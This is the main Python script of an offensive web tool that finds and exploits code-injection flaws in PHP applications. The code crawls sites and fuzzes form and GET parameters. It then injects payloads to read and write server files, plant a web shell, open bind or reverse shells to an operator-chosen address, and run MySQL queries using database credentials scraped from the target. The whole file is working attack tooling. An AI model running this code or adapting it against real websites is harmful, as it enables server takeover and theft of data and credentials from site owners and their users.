#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
#
#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
#--
import sys,os,sqlite3,urllib
if (os.name == 'nt'):
	for loc, dir, fn in os.walk(os.getcwd()):
		for d in dir: 
			if d is not []: 
				sys.path.append(os.path.join(os.getcwd()+'\\'+d))
else:
	for loc, dir, fn in os.walk(os.getcwd()):
		for d in dir: 
			if d is not []: 
				sys.path.append(os.path.join(os.getcwd()+'/'+d))			
			
def main():
	from formfinder import FRMFind
	from Options import Options
	from vulndb import VulnDB
	from fuzzer import Attack
	from exploitbuilder import xbuilder
	from crawler import Crawl
	opt,arg = Options().init()
	if (opt.clear_vuln_db == True):
		VulnDB().clear_vulns()
	if opt.url is not None: 
		#have we exploited this before?
		if opt.forms == True: 
			try:
				if opt.basicAuth is not None:
					getForm,postForm = FRMFind().search(opt.url,opt.basicAuth,None)
				elif opt.cookieValue is not None:
					getForm,postForm = FRMFind().search(opt.url,None,opt.basicAuth)
				else: getForm,postForm = FRMFind().search(opt.url,None,None)
			except:
				return
			for form in getForm.keys(): 
				vulnUrl = "%s//%s/%s" % (opt.url.split("/")[0],opt.url.split("/")[2],form[:-1])
				isVuln,vulnDeets = VulnDB().is_vuln('form',url=vulnUrl)
				if isVuln is True:
					print "URL has been exploited previously.. resuming attack"
					vulnTarget =  "%s?%s=%s%s" % (vulnDeets[0],vulnDeets[1],vulnDeets[2],vulnDeets[3])
					function = xbuilder().find_func(vulnTarget)
					if (opt.fsRead != None): 
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
						print xbuilder().inject(url,seed)[1]
						return
					if (opt.fsWrite != None): 
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
						print xbuilder().inject(url,seed)[1]
						return
					if (opt.osShell != None): 
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
						print xbuilder().inject(url,seed)[1]
						return
					if (opt.bindShell != None): 
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
						xbuilder().inject(url,seed)
						return
					if (opt.reverShell != None): 
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
						xbuilder().inject(url,seed)
						return
					''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
					if (opt.dbHook != None): 	
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
						string = xbuilder().inject(url,seed)[1]
						if ("$" != string[1].replace("<?php ","")):
							host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
							if (passw == "''"):
								hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result);""" % (host,user,opt.dbHook)
							else:
								hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result);""" % (host,user,passw.replace("'",""),opt.dbHook)
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
							print xbuilder().inject(url,seed)[1]
							return
						else:
							print "[*] string not in correct format"
							return						
		if opt.crawl == True: 
			try:
				if opt.basicAuth is not None:
					queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,opt.basicAuth,None)
				elif opt.cookieValue is not None:
					queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,None,opt.basicAuth)
				else: queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,None,None)	
				print "[*] found %s urls to crawl" % (len(queue))
			except:
				return
			for url in queue:	
				try:
					if opt.basicAuth is not None:
						getForm,postForm = FRMFind().search(url,opt.basicAuth,None)
					elif opt.cookieValue is not None:
						getForm,postForm = FRMFind().search(url,None,opt.basicAuth)
					else: getForm,postForm = FRMFind().search(url,None,None)
				except:
					return
				for form in getForm.keys(): 
					vulnUrl = "%s//%s/%s" % (url.split("/")[0],url.split("/")[2],form[:-1])
					isVuln,vulnDeets = VulnDB().is_vuln('crawl',url=vulnUrl)
					if isVuln is True:
						print "URL has been exploited previously.. resuming attack"
						vulnTarget =  "%s?%s=%s%s" % (vulnDeets[0],vulnDeets[1],vulnDeets[2],vulnDeets[3])
						function = xbuilder().find_func(vulnTarget)
						if (opt.fsRead != None): 
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
							print xbuilder().inject(url,seed)[1]
							return
						if (opt.fsWrite != None): 
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
							print xbuilder().inject(url,seed)[1]
							return
						if (opt.osShell != None): 
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
							print xbuilder().inject(url,seed)[1]
							return
						if (opt.bindShell != None): 
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
							xbuilder().inject(url,seed)
							return
						if (opt.reverShell != None): 
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
							xbuilder().inject(url,seed)
							return
						''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
						if (opt.dbHook != None): 	
							url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
							string = xbuilder().inject(url,seed)[1]
							if ("$" != string[1].replace("<?php ","")):
								host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
								if (passw == "''"):
									hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result);""" % (host,user,opt.dbHook)
								else:
									hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result);""" % (host,user,passw.replace("'",""),opt.dbHook)
								url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
								print xbuilder().inject(url,seed)[1]
								return
							else:
								print "[*] string not in correct format"
								return							
		else: 
			isVuln,vulnDeets = VulnDB().is_vuln('get',url=opt.url.split("?")[0])
			if isVuln is True:
				print "URL has been exploited previously.. resuming attack"
				vulnTarget =  "%s?%s=%s%s" % (vulnDeets[0],vulnDeets[1],vulnDeets[2],vulnDeets[3])
				function = xbuilder().find_func(vulnTarget)
				if (opt.fsRead != None): 
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
					print xbuilder().inject(url,seed)[1]
					return
				if (opt.fsWrite != None): 
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
					print xbuilder().inject(url,seed)[1]
					return
				if (opt.osShell != None): 
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
					print xbuilder().inject(url,seed)[1]
					return
				if (opt.bindShell != None): 
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
					xbuilder().inject(url,seed)
					return
				if (opt.reverShell != None): 
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
					xbuilder().inject(url,seed)
					return
				''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
				if (opt.dbHook != None): 	
					url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
					string = xbuilder().inject(url,seed)[1]
					if ("$" != string[1].replace("<?php ","")):
						host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
						print "[*] host %s user %s pass %s" % (host,user,passw)
						if (passw == "''"):
							hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,opt.dbHook)
						else:
							hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,passw.replace("'",""),opt.dbHook)
						url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
						print xbuilder().inject(url,seed)[1]
						return
					else:
						print "[*] string not in correct format"
						return					
		
		#find and exploit forms
		if opt.forms == True:
			try:
				if opt.basicAuth is not None:
					getForm,postForm = FRMFind().search(opt.url,opt.basicAuth,None)
				elif opt.cookieValue is not None:
					getForm,postForm = FRMFind().search(opt.url,None,opt.basicAuth)
				else: getForm,postForm = FRMFind().search(opt.url,None,None)
				print "[*] found %s GET inputs and %s POST inputs" % (len(getForm),len(postForm))
			except:
				return
			for form in getForm.keys():
				print "[*] name: %s params: %s" % (form, getForm[form])
				a = raw_input("[*] Do you want to test this form? Y/N ")
				if (a == "Y" or a == "y"):
					vuln,vulnTarget = Attack().vuln_detect("%s//%s/%s" % (opt.url.split("/")[0],opt.url.split("/")[2],form[:-1]),Attack().fuzz_gen(getForm[form]))
					if (vuln == True):
						print "[*] performing false positive reduction"
						if (Attack().reduce_false(vulnTarget) == True):
							a = raw_input("[*] Do you want to exploit this vulnerability? Y/N ")
							if (a == "Y" or a == "y"):
								function = xbuilder().find_func(vulnTarget)
								VulnDB().new_vuln('get',url=vulnTarget.split("?")[0],param=vulnTarget.split("?")[1].split("=")[0],originalvalue=vulnTarget.split("?")[1].split("=")[1].find("%"),payload=vulnTarget.split("?")[1].split("=")[1][len(str(vulnTarget.split("?")[1].split("=")[1].find("%"))):],formName=form,method='get')
								if (opt.fsRead != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
									print xbuilder().inject(url,seed)[1]
								if (opt.fsWrite != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
									print xbuilder().inject(url,seed)[1]
								if (opt.osShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
									print xbuilder().inject(url,seed)[1]
								if (opt.bindShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
									xbuilder().inject(url,seed)
								if (opt.reverShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
									xbuilder().inject(url,seed)
								''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
								if (opt.dbHook != None): 	
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
									string = xbuilder().inject(url,seed)[1]
									if ("$" != string[1].replace("<?php ","")):
										host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
										print "[*] host %s user %s pass %s" % (host,user,passw)
										if (passw == "''"):
											hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,opt.dbHook)
										else:
											hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,passw.replace("'",""),opt.dbHook)
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
										print xbuilder().inject(url,seed)[1]
										return
									else:
										print "[*] string not in correct format"
										return									
							elif (a == "N" or a == "n"):
								continue
							else:
								print "[*] invalid answer, skipping"
								continue												
				elif (a == "N" or a == "n"):
					continue
				else:
					print "[*] invalid answer, skipping"
					continue
			return
			
		#crawl for forms to exploit
		elif opt.crawl == True:
			try:
				if opt.basicAuth is not None:
					queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,opt.basicAuth,None)
				elif opt.cookieValue is not None:
					queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,None,opt.basicAuth)
				else: queue = Crawl().crawl(opt.url,opt.crawlDepth,opt.restrict_domain,None,None)	
				print "[*] found %s urls to crawl" % (len(queue))
			except:
				return
			for url in queue:
				if opt.basicAuth is not None:
					getForm,postForm = FRMFind().search(opt.url,opt.basicAuth,None)
				elif opt.cookieValue is not None:
					getForm,postForm = FRMFind().search(opt.url,None,opt.basicAuth)
				else: getForm,postForm = FRMFind().search(opt.url,None,None)
				print "[*] found %s GET inputs and %s POST inputs" % (len(getForm),len(postForm))
				for form in getForm.keys():
					print "[*] name: %s params: %s" % (form, getForm[form])
					a = raw_input("[*] Do you want to test this form? Y/N ")
					if (a == "Y" or a == "y"):
						vuln,vulnTarget = Attack().vuln_detect("%s//%s%s" % (opt.url.split("/")[0],opt.url.split("/")[2],form[:-1]),Attack().fuzz_gen(getForm[form]))
						if (vuln == True):
							print "[*] performing false positive reduction"	
							if (Attack().reduce_false(vulnTarget) == True):
								a = raw_input("[*] Do you want to exploit this vulnerability? Y/N ")
								if (a == "Y" or a == "y"):
									from exploitbuilder import xbuilder
									function = xbuilder().find_func(vulnTarget)
									from vulndb import VulnDB
									VulnDB().new_vuln('get',url=vulnTarget.split("?")[0],param=vulnTarget.split("?")[1].split("=")[0],originalvalue=vulnTarget.split("?")[1].split("=")[1].find("%"),payload=vulnTarget.split("?")[1].split("=")[1][len(str(vulnTarget.split("?")[1].split("=")[1].find("%"))):],formName=form,method='get')
									if (opt.fsRead != None): 
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
										print xbuilder().inject(url,seed)[1]
									if (opt.fsWrite != None): 
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
										print xbuilder().inject(url,seed)[1]
									if (opt.osShell != None): 
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
										print xbuilder().inject(url,seed)[1]
									if (opt.bindShell != None): 
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
										xbuilder().inject(url,seed)
									if (opt.reverShell != None): 
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
										xbuilder().inject(url,seed)
									''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
									if (opt.dbHook != None): 	
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
										string = xbuilder().inject(url,seed)[1]
										if ("$" != string[1].replace("<?php ","")):
											host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
											print "[*] host %s user %s pass %s" % (host,user,passw)
											if (passw == "''"):
												hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,opt.dbHook)
											else:
												hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData; } } mysql_free_result($result); mysql_close($link);""" % (host,user,passw.replace("'",""),opt.dbHook)
											url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
											print xbuilder().inject(url,seed)[1]
											return
										else:
											print "[*] string not in correct format"
											return										
								elif (a == "N" or a == "n"):
									continue
								else:
									print "[*] invalid answer, skipping"
									continue							
					elif (a == "N" or a == "n"):
						continue
					else:
						print "[*] invalid answer, skipping"
						continue
			return
		else:
		
			#exploit get variables
			if "?" in opt.url:
				url,params = opt.url.split("?")[0],opt.url.split("?")[1]
				new = {}
				for i in params.split("&"):
					new[i.split("=")[0]] = i.split("=")[1]
				vuln,vulnTarget = Attack().vuln_detect(url,Attack().fuzz_gen(new))
				if (vuln == True):
					print "[*] performing false positive reduction"
					if (Attack().reduce_false(vulnTarget) == True):
						a = raw_input("[*] Do you want to exploit this vulnerability? Y/N ")
						if (a == "Y" or a == "y"):
							from exploitbuilder import xbuilder
							function = xbuilder().find_func(vulnTarget)
							if (function != 0):
								VulnDB().new_vuln('get',url=vulnTarget.split("?")[0],param=vulnTarget.split("?")[1].split("=")[0],originalvalue=vulnTarget.split("?")[1].split("=")[1].find("%"),payload=vulnTarget.split("?")[1].split("=")[1][len(str(vulnTarget.split("?")[1].split("=")[1].find("%"))):])
								if (opt.fsRead != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_read=opt.fsRead))
									print xbuilder().inject(url,seed)[1]
								if (opt.fsWrite != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,fs_write=opt.fsWrite.split(":")[0],location=opt.fsWrite.split(":")[1]))
									print xbuilder().inject(url,seed)[1]
								if (opt.osShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,web_shell=opt.osShell))
									print xbuilder().inject(url,seed)[1]
								if (opt.bindShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,bind=1,address=opt.bindShell.split(":")[0],port=opt.bindShell.split(":")[1]))
									xbuilder().inject(url,seed)
								if (opt.reverShell != None): 
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,reverse=1,address=opt.reverShell.split(":")[0],port=opt.reverShell.split(":")[1]))
									xbuilder().inject(url,seed)
								''' EXPIREMENTAL, DB SUPPORT MYSQL 5.1>'''	
								if (opt.dbHook != None): 	
									url,seed = xbuilder().return_bypass_exploit(vulnTarget,xbuilder().return_payload(vulnTarget,function,hook=1))
									string = xbuilder().inject(url,seed)[1]
									if ("$" != string[1].replace("<?php ","")):
										host,user,passw = (string.split("(")[1].split(",")[0].replace("'",""),string.split("(")[1].split(",")[1].replace("'","").strip(),string.split("(")[1].split(",")[2].split("\n")[0][:-2].strip())
										if (passw == "''"):
											hook = """$link = mysql_connect('%s', '%s', ''); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData+'\n'; } } mysql_free_result($result); mysql_close($link);""" % (host,user,opt.dbHook)
										else:
											hook = """$link = mysql_connect('%s', '%s', '%s'); if (!$link) { die('Could not connect: ' . mysql_error()); } $result = mysql_query('%s'); if (!$result) { $message  = 'Invalid query: ' . mysql_error() . "\n"; $message .= 'Whole query: ' . $query; die($message);} while ($row = mysql_fetch_row($result)) { foreach ($row as $columnName => $columnData) { echo $columnData+'\n'; } } mysql_free_result($result); mysql_close($link);""" % (host,user,passw.replace("'",""),opt.dbHook)
										url,seed = xbuilder().return_bypass_exploit(vulnTarget,hook)
										print xbuilder().inject(url,seed)[1]
										return
									else:
										print "[*] string not in correct format"
										return
				return
				
			else:
				#nothing to inject
				print "[*] no injection points specified"
				return
		return
	else:
		print "[*] the URL was not provided"
		return
	

if __name__=="__main__":
	main()
